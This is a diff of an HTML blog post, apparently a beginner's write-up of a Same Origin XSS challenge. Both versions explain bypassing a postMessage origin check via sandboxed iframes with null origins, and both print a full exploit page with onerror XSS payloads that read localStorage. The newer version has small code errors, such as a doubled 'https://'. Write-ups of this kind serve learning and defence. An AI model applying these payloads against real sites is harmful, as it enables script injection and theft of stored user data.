@@ -1,435 +1,314 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="A beginner-friendly writeup explaining the Same Origin XSS challenge by NDevTK and terjanq.">
-  <title>Same Origin XSS Challenge Writeup</title>
-  <style>
-    :root {
-      background: #0a0a0a;
-  color: #ddd;
-      --max: 760px;
-    }
-
-    * { box-sizing: border-box; }
-
-    html { scroll-behavior: smooth; }
-
-    body {
-      margin: 0;
-      background: var(--bg);
-      color: var(--text);
-      font-family: "Times New Roman", Times, serif;
-      -webkit-font-smoothing: antialiased;
-      text-rendering: optimizeLegibility;
-    }
-
-    .page {
-      width: min(100% - 40px, 760px);
-      margin: 0 auto;
-      padding: 38px 0 90px;
-    }
-
-    .site-title {
-      display: inline-block;
-      margin-bottom: 38px;
-      color: #f0f3f6;
-      font-family: Arial, Helvetica, sans-serif;
-      font-size: 15px;
-      font-weight: 700;
-      text-decoration: none;
-    }
-
-    h1, h2 {
-      color: #f0f3f6;
-      line-height: 1.25;
-    }
-
-    h1 {
-      margin: 0 0 10px;
-      font-size: clamp(28px, 5vw, 38px);
-      font-weight: 700;
-    }
-
-    h2 {
-      margin: 52px 0 16px;
-      font-size: 24px;
-    }
-
-    p { margin: 0 0 20px; }
-
-    .date {
-      margin: 0 0 36px;
-      color: var(--muted);
-      font-size: 16px;
-    }
-
-    a {
-      color: var(--link);
-      text-decoration-thickness: 1px;
-      text-underline-offset: 2px;
-    }
-
-    .toc {
-      margin: 36px 0 42px;
-      padding: 18px 22px;
-      border-top: 1px solid var(--line);
-      border-bottom: 1px solid var(--line);
-    }
-
-    .toc-title {
-      margin: 0 0 10px;
-      font-weight: 700;
-    }
-
-    .toc ol {
-      margin: 0;
-      padding-left: 25px;
-    }
-
-    .toc li { margin: 4px 0; }
-
-    code {
-      padding: 2px 5px;
-      border-radius: 3px;
-      background: var(--code-bg);
-      font-family: Consolas, "Liberation Mono", Menlo, monospace;
-      font-size: .88em;
-    }
-
-    pre {
-      margin: 22px 0 28px;
-      padding: 18px 20px;
-      overflow-x: auto;
-      border: 1px solid #30363d;
-      border-radius: 2px;
-      background: var(--code-bg);
-      line-height: 1.5;
-    }
-
-    pre code {
-      padding: 0;
-      background: transparent;
-      font-size: 13px;
-    }
-
-    .image-placeholder {
-      display: grid;
-      min-height: 280px;
-      margin: 30px 0;
-      padding: 28px;
-      place-items: center;
-      border: 1px dashed #484f58;
-      background: #161b22;
-      color: #9aa4b2;
-      text-align: center;
-      font-family: Arial, Helvetica, sans-serif;
-      font-size: 13px;
-    }
-
-    .note {
-      padding-left: 18px;
-      border-left: 3px solid #484f58;
-      color: #b1bac4;
-    }
-
-    @media (max-width: 600px) {
-      body { font-size: 17px; }
-      .page { width: min(100% - 28px, 820px); padding-top: 28px; }
-      h2 { font-size: 24px; }
-      pre { padding: 14px; }
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Writeup</title>
+<style>
+:root {
+background: #0a0a0a;
+color: #ddd;
+--max: 760px;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+margin: 0;
+background: var(--bg);
+color: var(--text);
+font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+-webkit-font-smoothing: antialiased;
+text-rendering: optimizeLegibility;
+}
+a {
+color: inherit;
+text-decoration: none;
+}
+.page {
+min-height: 100vh;
+}
+.site-header {
+width: 100%;
+padding: 18px 32px 0;
+}
+.site-header-inner {
+display: flex;
+align-items: center;
+gap: 10px;
+font-weight: 700;
+font-size: 22px;
+color: #f3f3f4;
+}
+.site-header-inner .icon {
+font-size: 18px;
+opacity: 0.9;
+}
+.container {
+width: min(calc(100% - 48px), var(--max));
+margin: 0 auto;
+}
+.hero {
+padding-top: 82px;
+}
+.post-title {
+margin: 0;
+font-size: clamp(40px, 5.2vw, 54px);
+line-height: 1.12;
+letter-spacing: -0.035em;
+font-weight: 800;
+color: #e9e9eb;
+}
+.post-meta {
+margin-top: 12px;
+color: var(--muted);
+font-size: 15px;
+line-height: 1.6;
+}
+.toc {
+margin-top: 28px;
+background: var(--panel);
+border-radius: 10px;
+overflow: hidden;
+border: 1px solid rgba(255,255,255,0.03);
+}
+.toc summary {
+list-style: none;
+cursor: pointer;
+padding: 16px 22px;
+font-size: 18px;
+font-weight: 700;
+display: flex;
+align-items: center;
+gap: 12px;
+user-select: none;
+}
+.toc summary::-webkit-details-marker { display: none; }
+.toc summary::before {
+content: "▶";
+font-size: 15px;
+transform: translateY(-1px);
+opacity: 0.95;
+transition: transform 0.2s ease;
+}
+.toc[open] summary::before {
+transform: rotate(90deg);
+}
+.toc-content {
+padding: 0 22px 16px 49px;
+color: var(--muted);
+}
+.toc-content ol {
+margin: 0;
+padding-left: 18px;
+}
+.toc-content li + li {
+margin-top: 10px;
+}
+main.article {
+padding: 52px 0 100px;
+}
+.article p {
+margin: 0 0 24px;
+font-size: 21px;
+line-height: 1.75;
+color: #e2e3e6;
+letter-spacing: -0.012em;
+}
+.article p:last-child {
+margin-bottom: 0;
+}
+.article a {
+text-decoration: underline;
+text-underline-offset: 5px;
+text-decoration-thickness: 1px;
+}
+.article h2 {
+margin: 80px 0 18px;
+font-size: 34px;
+line-height: 1.2;
+letter-spacing: -0.03em;
+font-weight: 800;
+color: #ededee;
+}
+.article img {
+display: block;
+max-width: 100%;
+height: auto;
+border-radius: 12px;
+margin: 28px 0;
+}
+.article hr {
+border: 0;
+height: 1px;
+background: var(--line);
+margin: 54px 0;
+}
+.article blockquote {
+margin: 28px 0;
+padding: 8px 0 8px 18px;
+border-left: 3px solid rgba(255,255,255,0.14);
+color: var(--muted);
+}
+.article code {
+font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+font-size: 0.9em;
+background: rgba(255,255,255,0.05);
+padding: 0.15em 0.35em;
+border-radius: 6px;
+}
+.article pre {
+overflow-x: auto;
+padding: 18px 20px;
+border-radius: 12px;
+background: #181a1f;
+border: 1px solid rgba(255,255,255,0.05);
+margin: 24px 0 28px;
+}
+.article pre code {
+background: transparent;
+padding: 0;
+border-radius: 0;
+font-size: 15px;
+line-height: 1.7;
+color: #d8dae0;
+}
+.lead-space {
+height: 4px;
+}
+@media (max-width: 900px) {
+.site-header {
+padding-left: 22px;
+padding-right: 22px;
+}
+.container {
+width: min(calc(100% - 32px), var(--max));
+}
+.hero {
+padding-top: 56px;
+}
+.post-title {
+font-size: clamp(32px, 8vw, 44px);
+}
+.article p {
+font-size: 18px;
+}
+.article h2 {
+font-size: 28px;
+}
+}
+</style>
 </head>
+
 <body>
-  <main class="page">
-    <a class="site-title" href="#">bug.writeups</a>
+<div class="page">
+<header class="site-header">
+<div class="site-header-inner">
+<span>bug.writeups</span>
+</div>
+</header>
 
-    <article>
-      <header>
-        <h1>Same Origin XSS Challenge Writeup</h1>
-        <p class="date">20th September, 2026</p>
-      </header>
+<main class="article">
+<div class="container">
 
-      <nav class="toc" aria-label="Table of contents">
-        <p class="toc-title">Table of Contents</p>
-        <ol>
-          <li><a href="#objective">Challenge objective (Simplified)</a></li>
-          <li><a href="#thought-process">Challenge solution thought process</a></li>
-          <li><a href="#sandbox-iframes">Sandbox iframes</a></li>
-          <li><a href="#solution">Challenge solution</a></li>
-          <li><a href="#final-payload">Final payload</a></li>
-        </ol>
-      </nav>
+<p>In this blog, I am going to explain the solution for the same origin xss challenge created by <a href="https://twitter.com/ndevtk">NDevTK</a> and <a href="https://twitter.com/terjanq">terjanq</a>. I am around beginner to intermediate level in client side so this challenge taught me a lot of things and I couldn't quite understand the solution at first try. However, I'll be explaining it in the simplest form as per my ability to.</p>
 
-      <p>
-        In this blog, I am going to explain the solution for the Same Origin XSS challenge created by
-        <a href="https://twitter.com/ndevtk" target="_blank" rel="noopener noreferrer">NDevTK</a> and
-        <a href="https://twitter.com/terjanq" target="_blank" rel="noopener noreferrer">terjanq</a>.
-        I am around beginner to intermediate level in client-side security, so this challenge taught
-        me a lot of things and I couldn't quite understand the solution on my first try. However,
-        I'll be explaining it in the simplest form as per my ability.
-      </p>
+<h2>Challenge objective(Simplified)</h2>
 
-      <h2 id="objective">1. Challenge objective (Simplified)</h2>
+<p>So, the main objective of this challenge is to read the <code>localStorage.html</code> property of <a href="https://so-xss.terjanq.me/iframe.php">https://so-xss.terjanq.me/iframe.php</a>  page. <code>localStorage.html</code> property is set whenever you save any code on <a href="https://so-xss.terjanq.me">https://so-xss.terjanq.me.</a> The /iframe.php page exposes a postmessage handler with the following code:</p>
 
-      <p>
-        The main objective of this challenge is to read the <code>localStorage.html</code> property of
-        <a href="https://so-xss.terjanq.me/iframe.php" target="_blank" rel="noopener noreferrer">https://so-xss.terjanq.me/iframe.php</a>.
-        The <code>localStorage.html</code> property is set whenever you save any code on
-        <a href="https://so-xss.terjanq.me/" target="_blank" rel="noopener noreferrer">https://so-xss.terjanq.me/</a>.
-        The <code>/iframe.php</code> page exposes a <code>postMessage</code> handler with the following code:
-      </p>
+<pre><code>const identifier = 'random_string'; onmessage = e => { const data = e.data; if (e.origin !== window.origin && data.identifier !== identifier) return; if (data.type === 'render') { renderContainer.innerHTML = data.body; } }
 
-      <pre><code>const identifier = 'random_string';
+</code></pre>
 
-onmessage = e => {
-  const data = e.data;
+<p>We'll be working with this event handler throughout the challenge.</p>
 
-  if (e.origin !== window.origin && data.identifier !== identifier)
-    return;
+<h2>Challenge solution thought process</h2>
 
-  if (data.type === 'render') {
-    renderContainer.innerHTML = data.body;
-  }
-}</code></pre>
+<p>The message handler is fairly simple. As you can see, in order to get the XSS we need to first make the <code>if (e.origin !== window.origin && data.identifier !== identifier)</code> code block evaluate to <code>false</code> so that it doesn't skip the rendering part. The condition says, It will evaluate to  true if the origin sending the message and the origin of the window is not equal and the identifer sent by the messaging origin is not equal to the specified identifier. Since it is using && operator We need to make one of the conditions <code>false</code>.</p>
 
-      <p>We'll be working with this event handler throughout the challenge.</p>
+<h2>Sandbox iframes</h2>
 
-      <h2 id="thought-process">2. Challenge solution thought process</h2>
+<p>We can create sandbox iframes using the sandbox attribute of iframe tag. like this:</p>
 
-      <p>
-        The message handler is fairly simple. In order to get the XSS, we first need to make
-        <code>if (e.origin !== window.origin &amp;&amp; data.identifier !== identifier)</code>
-        evaluate to <code>false</code> so that execution doesn't stop before the rendering part.
-      </p>
+<p>whenever a sandbox attribute is defined in an iframe tag, the browser will set the origin of the iframe to null(an opaque origin) completely isolating it from the original origin i.e test.com and the sandbox attribute also imposes a lot of restrictions such as not being able to run any script, popups and many more. read more : <a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp">https://www.w3schools.com/tags/att_iframe_sandbox.asp</a> Since the browser sees it as a completely different origin. it also cannot access the localstorage or cookies.</p>
 
-      <p>
-        The condition evaluates to <code>true</code> when the origin sending the message differs
-        from the window's origin <em>and</em> the identifier sent with the message differs from the
-        expected identifier. Because the code uses the <code>&amp;&amp;</code> operator, making either
-        comparison <code>false</code> is enough to make the complete condition false.
-      </p>
+<p>another fun quirk of this is that any page opened up by a sandboxed iframe inherits the property of it's opener. for e.g if you have a page with the following code:</p>
 
-      <h2 id="sandbox-iframes">3. Sandbox iframes</h2>
-
-      <p>We can create sandboxed iframes using the <code>sandbox</code> attribute:</p>
-
-      <pre><code>&lt;iframe
-  src="https://mydomain.com"
-  sandbox="allow-scripts allow-popups"&gt;
-&lt;/iframe&gt;</code></pre>
-
-      <p>
-        When an iframe is sandboxed without <code>allow-same-origin</code>, its content is treated
-        as having an opaque origin. In the situations relevant to this challenge, this means its
-        serialized origin is <code>null</code>. The sandbox also restricts capabilities unless they
-        are explicitly allowed, such as scripts, popups, navigation, and modals.
-      </p>
-
-      <p>
-        Since this sandboxed context is no longer treated as the page's normal origin, it also
-        cannot use that origin's normal storage access in the way an unsandboxed same-origin page can.
-      </p>
-
-      <p>
-        Another useful behavior here is that a popup opened from a sandboxed iframe can inherit
-        sandbox restrictions unless the sandbox configuration allows it to escape them. Consider:
-      </p>
-
-      <pre><code>&lt;html&gt;
+<pre><code>&lt;html&gt;
 &lt;head&gt;&lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;
 &lt;body&gt;
-  &lt;h1&gt;This is a test page&lt;/h1&gt;
-
-  &lt;iframe
-    src="https://mydomain.com"
-    sandbox="allow-scripts allow-popups"&gt;
-  &lt;/iframe&gt;
+&lt;h1&gt;This is a test page&lt;/h1&gt;
+&lt;iframe src=https://mydomain.com sandbox='allow-scripts allow-popups'&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-      <p>And suppose <code>mydomain.com</code> contains:</p>
+<p>and the mydomain.com has the following code:</p>
 
-      <pre><code>&lt;html&gt;
+<pre><code>&lt;html&gt;
 &lt;head&gt;&lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;
 &lt;body&gt;
-  &lt;h1&gt;This is a test page&lt;/h1&gt;
-
-  &lt;script&gt;
-    // Allowed because the iframe has allow-scripts.
-    window.open("https://victimsite.com");
-  &lt;/script&gt;
+&lt;h1&gt;This is a test page&lt;/h1&gt;
+&lt;script&gt;// this page can run scripts because of 'allow-scripts' permission in sandbox attribute window.open("https://victimsite.com"); // because of allow-popups permission &lt;/script&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-      <p>
-        In this setup, the opened page remains affected by the opener's sandbox restrictions. This
-        behavior is the main trick used in the first part of the challenge.
-      </p>
+<p>Now, In this context the 'window.origin' property for victimsite.com will also be null and it will also inherit the sandbox properties i.e allow-scripts and allow-popups but it cannot use other functions such as alert() or prompt() because it requires allow-modals permission. This is the main trick that we are going to be using to solve the lab.</p>
 
-      <h2 id="solution">4. Challenge solution</h2>
+<h2>Challenge solution</h2>
 
-      <p>
-        First, we can use the opaque-origin behavior to bypass the first comparison in the
-        <code>postMessage</code> check:
-      </p>
+<p>First of all, we have a pretty simple postmessage xss using this 'null' trick. As you already know, In order to get the xss we have to make the following code evaluate to 'false':<br>(e.origin !== window.origin && data.identifier !== identifier)</p>
 
-      <pre><code>e.origin !== window.origin</code></pre>
+<p>one way to make this condition false is when e.origin and window.origin are both equal. If both of them are the same then the condition: e.origin !== window.origin will be false and hence the whole condition becomes false. So, how can we make these e.origin and window.origin equal?. You guessed it right, using the null trick. If both of them have the same value null then it will be false.</p>
 
-      <p>
-        If the sending context and receiving context both serialize their origins as
-        <code>null</code>, the comparison becomes <code>false</code>. Because the complete check
-        uses <code>&amp;&amp;</code>, the entire condition becomes false.
-      </p>
+<p>you have your attacker page:<br><a href="https://attacker.com">https://attacker.com</a>:</p>
 
-      <p>For example, the attacker page can contain:</p>
-
-      <pre><code>&lt;html&gt;
+<pre><code>&lt;html&gt;
 &lt;head&gt;&lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;
 &lt;body&gt;
-  &lt;h1&gt;This is a test page&lt;/h1&gt;
-
-  &lt;iframe
-    src="https://attacker.com/iframe.html"
-    sandbox="allow-scripts allow-popups"&gt;
-  &lt;/iframe&gt;
+&lt;h1&gt;This is a test page&lt;/h1&gt;
+&lt;iframe src=https://attacker.com/iframe.html sandbox='allow-scripts allow-popups'&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-      <p>Then <code>iframe.html</code> opens the challenge page and sends the rendering message.</p>
+<p>and the iframe.html has the following code:</p>
 
-      <p>
-        At this stage, arbitrary HTML can be rendered in the sandboxed challenge window. However,
-        simply executing something equivalent to <code>alert(localStorage.html)</code> there does
-        not solve the challenge because that opened page is still operating under the inherited
-        sandbox restrictions and cannot access the target's normal origin storage.
-      </p>
-
-      <p>
-        To read the property, we need XSS execution inside an <strong>unsandboxed</strong>
-        <code>so-xss.terjanq.me/iframe.php</code> page. The solution is to keep a reference to the
-        original top-level attacker window, navigate that window to the challenge origin, and then
-        use the already-compromised sandboxed window to send a second payload to it.
-      </p>
-
-      <div class="image-placeholder">
-        <div>
-          <strong>Exploit-flow image goes here</strong><br>
-          Sandboxed attacker iframe → sandboxed challenge popup → redirect top window →<br>
-          unsandboxed challenge page → second postMessage → localStorage.html
-        </div>
-      </div>
-
-      <h2 id="final-payload">5. Final payload</h2>
-
-      <pre><code>&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-  &lt;meta charset="UTF-8"&gt;
-  &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-  &lt;title&gt;My first writeup&lt;/title&gt;
-&lt;/head&gt;
+<pre><code>&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Demo for /iframe.html&lt;/title&gt;&lt;/head&gt;
 &lt;body&gt;
-
+&lt;h1&gt;This is a test page&lt;/h1&gt;
 &lt;script&gt;
-let iframe = document.createElement('iframe');
-
-iframe.sandbox =
-  'allow-scripts allow-popups allow-top-navigation';
-
-let payload =
-  "x=opener.top; opener.postMessage(1,'*'); " +
-  "setTimeout(() =&gt; { " +
-  "x.postMessage({type: 'render',identifier," +
-  "body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'}, '*'); " +
-  "}, 1000)";
-
-iframe.srcdoc = `
-  &lt;h1&gt;hello&lt;/h1&gt;
-
-  &lt;script&gt;
-    onclick = e =&gt; {
-      let w = open('https://so-xss.terjanq.me/iframe.php');
-
-      onmessage = e =&gt;
-        top.location = 'https://so-xss.terjanq.me/iframe.php';
-
-      setTimeout(_ =&gt; {
-        w.postMessage({
-          type: "render",
-          body: "&lt;audio/src/onerror=\\\\&quot;${payload}\\\\&quot;&gt;"
-        }, '*')
-      }, 1000);
-    };
-  &lt;\/script&gt;
-`;
-
-document.body.appendChild(iframe);
+let b=window.open("https://https://so-xss.terjanq.me/iframe.php");
+b.postMessage("&lt;img src=x onerror=console.log('xss)","*");
 &lt;/script&gt;
-
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-      <p>
-        First, the sandboxed iframe sends a payload using an <code>audio</code> element. The
-        JavaScript executed by that payload is conceptually:
-      </p>
+<p>and our payload is successfully rendered on the https://so-xss.terjanq.me/iframe.php page. However, we still cannot do smth like &lt;img src=x onerror=alert(localStorage.html)&gt; and read the property  since the opened https://so-xss.terjanq.me/iframe.php page is sandboxed so the browser treats this as a different origin so it won't have access to the localStorage of the original so-xss.terjanq.me/iframe.php page.</p>
 
-      <pre><code>x = opener.top;
-opener.postMessage(1, '*');
+<p>In order to read the property, we need an xss on so-xss.terjanq.me/iframe.php which is not sandboxed. this can be done by redirecting the opener page(attacker.com) to so-xss.terjanq.me/iframe.php and sending the xss payload from the opened sandboxed so-xss.terjanq.me/iframe.php page. something like this:</p>
 
-setTimeout(() =&gt; {
-  x.postMessage({
-    type: 'render',
-    identifier,
-    body: '&lt;img src=x onerror=alert(localStorage.html)&gt;'
-  }, '*');
-}, 1000);</code></pre>
+<p><img src="https://yunxohang.github.io/writeups/Untitled%20Diagram.drawio.png"></p>
 
-      <p>
-        Here, <code>x</code> is assigned <code>opener.top</code>, which refers to the parent
-        top-level page. The opened page then sends a message back to its opener. The opener has:
-      </p>
+<p>so the final payload will look like this:</p>
 
-      <pre><code>onmessage = e =&gt;
-  top.location = 'https://so-xss.terjanq.me/iframe.php';</code></pre>
+<pre><code>&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt;     &lt;meta charset="UTF-8"&gt;     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;     &lt;title&gt;My first writeup&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;script&gt;  let iframe = document.createElement('iframe');     iframe.sandbox = 'allow-scripts allow-popups allow-top-navigation'; let payload = "x=opener.top; opener.postMessage(1,'*'); setTimeout(() =&gt; { x.postMessage({type: 'render',identifier,body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'}, '*'); }, 1000)";   iframe.srcdoc=` &lt;h1&gt;hello&lt;/h1&gt; &lt;script&gt; onclick = e =&gt; {         let w = open('https://so-xss.terjanq.me/iframe.php');         onmessage = e =&gt; top.location = 'https://so-xss.terjanq.me/iframe.php';         setTimeout(_ =&gt; {           w.postMessage({type: "render", body: "&lt;audio/src/onerror=\\&quot;${payload}\\&quot;&gt;"}, '*')         }, 1000);       };     &lt;\/script&gt; `  document.body.appendChild(iframe); &lt;/script&gt;   &lt;/body&gt; &lt;/html&gt;</code></pre>
 
-      <p>
-        This navigates the top-level attacker page to
-        <code>https://so-xss.terjanq.me/iframe.php</code>. Importantly, the earlier reference stored
-        in <code>x</code> still refers to that window, but the window has now navigated to an
-        unsandboxed page on the challenge origin.
-      </p>
+<p>first of all, the sandboxed iframe, sends a payload using audio tag. the payload sent is:</p>
 
-      <p>
-        The first bypass relied on both relevant origins being <code>null</code>. That no longer
-        applies to the unsandboxed target. Instead, the second comparison can be made false:
-      </p>
+<pre><code>x=opener.top; opener.postMessage(1,'*'); setTimeout(() =&gt; { x.postMessage({type: 'render',identifier,body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'}, '*'); }, 1000)</code></pre>
 
-      <pre><code>data.identifier !== identifier</code></pre>
+<p>here, x is assigned opener.top which refers to the parent page i.e attacker.com and the opened page sends a postMessage to the opener, the opener has the following message listener:</p>
 
-      <p>
-        The script running in the compromised challenge context has access to
-        <code>identifier</code>, so it can include the correct value in the second
-        <code>postMessage</code>. The final message is therefore:
-      </p>
+<pre><code> onmessage = e =&gt; top.location = 'https://so-xss.terjanq.me/iframe.php';</code></pre>
 
-      <pre><code>x.postMessage({
-  type: 'render',
-  identifier,
-  body: '&lt;img src=x onerror=alert(localStorage.html)&gt;'
-}, '*');</code></pre>
+<p> which just redirects the parent page to <code>https://so-xss.terjanq.me/iframe.php</code> , now since we already have a reference to opener.top i.e the parent page which is now <code>so-xss.terjanq.me/iframe.php</code> which is not sandboxed or anything, we can now read the localStorage.html property. but how do we trigger the xss. At first we could trigger the xss because both of the origin was null, but now it is not sanboxed. we can use the other condition and make it false, i.e data.identifier !== identifier , we are currently on the opened <code>so-xss.terjanq.me/iframe.php</code> page so we have access to the identifier value and if we sent the identifier in the postMessage , the condition  data.identifier !== identifier will be false.<br>and the final payload will be:</p>
 
-      <p>
-        Now <code>data.identifier !== identifier</code> evaluates to <code>false</code>, the render
-        branch executes in the unsandboxed same-origin page, and the injected handler can access
-        <code>localStorage.html</code>.
-      </p>
+<p><code>x.postMessage({type: 'render',identifier,body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'}, '*')</code></p>
 
-      <p>And that concludes the solution for this challenge.</p>
-    </article>
-  </main>
+<p>which concludes the solution for this challenge.</p>
+
+</div>
+</main>
+</div>
 </body>
 </html>
